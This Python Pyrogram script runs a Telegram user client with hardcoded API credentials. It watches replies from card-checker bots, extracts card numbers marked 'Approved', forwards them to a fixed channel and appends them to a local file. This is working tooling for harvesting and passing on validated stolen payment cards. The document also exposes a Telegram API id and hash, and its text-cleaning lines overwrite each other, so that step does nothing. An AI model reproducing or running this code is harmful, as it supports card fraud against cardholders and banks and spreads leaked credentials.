import pyrogram
import re
import asyncio

app = pyrogram.Client(
                      'ALLINONE_ALPHA',
                      api_id = '6258636',
                      api_hash = '72e82ac4cfe8fe0df32860140fc8014d'
                    )

SEND_ID = -1001956805655

def filter_cards(text):
    regex = r'\d{16}.*\d{3}'
    matches = re.findall(regex, text)
    if matches:
        return ''.join(matches)
    elif not matches:
        return

async def ALPHA(Client, message):
    rt = 0
    try:
        while rt < 6:
            if 'Please wait...' in message.text or 'Waiting for result.' in message.text or 'Checking CC. Please wait.🟥' in message.text or 'Checking CC. Please wait.🟧' in message.text or 'Checking CC. Please wait.🟩' in message.text or 'CHECKING CARD 🔴' in message.text or 'Starting Checking!' in message.text or 'ア AlisaChk working on your card' in message.text or 'Espere por favor.' in message.text or 'FIRST INFO | [アスタ-CHK]' in message.text or 'Checking your card...⌛' in message.text or '🝂 WAIT A FEW SECONDSSECONDS' in message.text:
                await asyncio.sleep(30)
                message = await Client.get_messages(chat_id=message.chat.id, message_ids=message.id)
                rt += 1
                continue
            else:
                break
                
        if re.search(r'𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅', message.text):
        
        
            if filter_cards(message.text) == None:
                return
                
#@RitaaChk_Bot                
            new_text = re.sub(r'Proxy - 🝂 Live! ✅', '', message.text)
            new_text = re.sub(r'Time in Progress .* s', '', message.text)
            new_text = re.sub(r'Checked by: .*]', '', message.text)
            new_text = re.sub(r'Bot by  - 🝂 Thkss', '', message.text)
            
            
            
            
            await Client.send_message(SEND_ID, text=new_text)
            with open('ALPHA.txt', 'a', encoding = 'utf-8') as f:
                f.write(filter_cards(message.text)+' - Gay CC ✅\n')
                f.close()
                return
    except Exception as e:
        print(e)

@app.on_message()
async def suck(Client, message):
    if message.text:
        await asyncio.create_task(ALPHA(Client, message))

app.run()
